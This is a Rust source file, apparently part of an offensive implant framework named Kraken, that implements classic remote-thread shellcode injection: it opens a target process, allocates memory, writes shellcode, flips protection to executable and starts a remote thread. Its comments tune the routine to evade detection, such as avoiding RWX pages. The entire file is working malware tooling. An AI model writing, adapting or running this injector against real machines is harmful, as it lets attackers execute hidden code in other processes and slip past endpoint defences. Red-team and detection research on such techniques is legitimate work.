//! Tier 1: Win32 API injection
//!
//! Classic injection using documented Win32 APIs:
//! - VirtualAllocEx: Allocate memory in target process
//! - WriteProcessMemory: Write shellcode to allocated memory
//! - VirtualProtectEx: Change memory protection to executable
//! - CreateRemoteThread: Start execution in target process
//!
//! This is the most compatible but also most detected technique.

use crate::{handle::OwnedHandle, InjectionResult};
use common::KrakenError;

use windows_sys::Win32::Foundation::WAIT_OBJECT_0;
use windows_sys::Win32::System::Diagnostics::Debug::WriteProcessMemory;
use windows_sys::Win32::System::Memory::{
    VirtualAllocEx, VirtualFreeEx, VirtualProtectEx, MEM_COMMIT, MEM_RELEASE, MEM_RESERVE,
    PAGE_EXECUTE_READ, PAGE_READWRITE,
};
use windows_sys::Win32::System::Threading::{
    CreateRemoteThread, OpenProcess, WaitForSingleObject, PROCESS_CREATE_THREAD,
    PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_WRITE,
};

/// Inject using classic Win32 APIs
///
/// # Arguments
/// * `target_pid` - Process ID of the target
/// * `shellcode` - The shellcode bytes to inject
/// * `wait` - Whether to wait for the injected thread to complete
/// * `timeout_ms` - Timeout in milliseconds (0 = infinite)
///
/// # Returns
/// * `Ok(InjectionResult)` on success
/// * `Err(KrakenError)` on failure
pub fn inject(
    target_pid: u32,
    shellcode: &[u8],
    wait: bool,
    timeout_ms: u32,
) -> Result<InjectionResult, KrakenError> {
    let access =
        PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION;

    // Open target process
    let proc_handle = unsafe { OpenProcess(access, 0, target_pid) };
    let proc_handle = OwnedHandle::new(proc_handle)
        .ok_or_else(|| KrakenError::Module("failed to open target process".into()))?;

    tracing::debug!(target_pid, "opened target process");

    // Allocate RW memory in target (NOT RWX - we change protection later)
    let remote_mem = unsafe {
        VirtualAllocEx(
            proc_handle.as_raw(),
            std::ptr::null(),
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        )
    };

    if remote_mem.is_null() {
        return Err(KrakenError::Module("VirtualAllocEx failed".into()));
    }

    tracing::debug!(
        target_pid,
        addr = ?remote_mem,
        size = shellcode.len(),
        "allocated remote memory"
    );

    // Write shellcode to target
    let mut bytes_written: usize = 0;
    let write_result = unsafe {
        WriteProcessMemory(
            proc_handle.as_raw(),
            remote_mem,
            shellcode.as_ptr() as *const _,
            shellcode.len(),
            &mut bytes_written,
        )
    };

    if write_result == 0 {
        // Cleanup on failure
        unsafe {
            VirtualFreeEx(proc_handle.as_raw(), remote_mem, 0, MEM_RELEASE);
        }
        return Err(KrakenError::Module("WriteProcessMemory failed".into()));
    }

    tracing::debug!(
        target_pid,
        bytes_written,
        "wrote shellcode to target"
    );

    // Change protection to RX (never RWX - that's a detection signal)
    let mut old_protect: u32 = 0;
    let protect_result = unsafe {
        VirtualProtectEx(
            proc_handle.as_raw(),
            remote_mem,
            shellcode.len(),
            PAGE_EXECUTE_READ,
            &mut old_protect,
        )
    };

    if protect_result == 0 {
        unsafe {
            VirtualFreeEx(proc_handle.as_raw(), remote_mem, 0, MEM_RELEASE);
        }
        return Err(KrakenError::Module("VirtualProtectEx failed".into()));
    }

    tracing::debug!(target_pid, "changed memory protection to RX");

    // Create remote thread to execute shellcode
    let mut thread_id: u32 = 0;
    let thread_handle = unsafe {
        CreateRemoteThread(
            proc_handle.as_raw(),
            std::ptr::null(),
            0,
            // SAFETY: We're transmuting the remote memory address to a thread start routine
            // This is the standard pattern for shellcode injection
            Some(std::mem::transmute(remote_mem)),
            std::ptr::null(),
            0,
            &mut thread_id,
        )
    };

    let thread_handle = OwnedHandle::new(thread_handle);

    if thread_handle.is_none() {
        unsafe {
            VirtualFreeEx(proc_handle.as_raw(), remote_mem, 0, MEM_RELEASE);
        }
        return Err(KrakenError::Module("CreateRemoteThread failed".into()));
    }

    tracing::info!(
        target_pid,
        thread_id,
        "created remote thread"
    );

    // Wait for thread completion if requested
    if wait {
        let thread_handle = thread_handle.unwrap();
        let timeout = if timeout_ms == 0 { 0xFFFFFFFF } else { timeout_ms };
        let wait_result = unsafe { WaitForSingleObject(thread_handle.as_raw(), timeout) };
        if wait_result != WAIT_OBJECT_0 {
            tracing::warn!(target_pid, thread_id, "injection thread wait timed out");
        }
    }

    Ok(InjectionResult {
        success: true,
        thread_id: Some(thread_id),
        technique_used: "Win32 CreateRemoteThread".to_string(),
        error: None,
    })
}
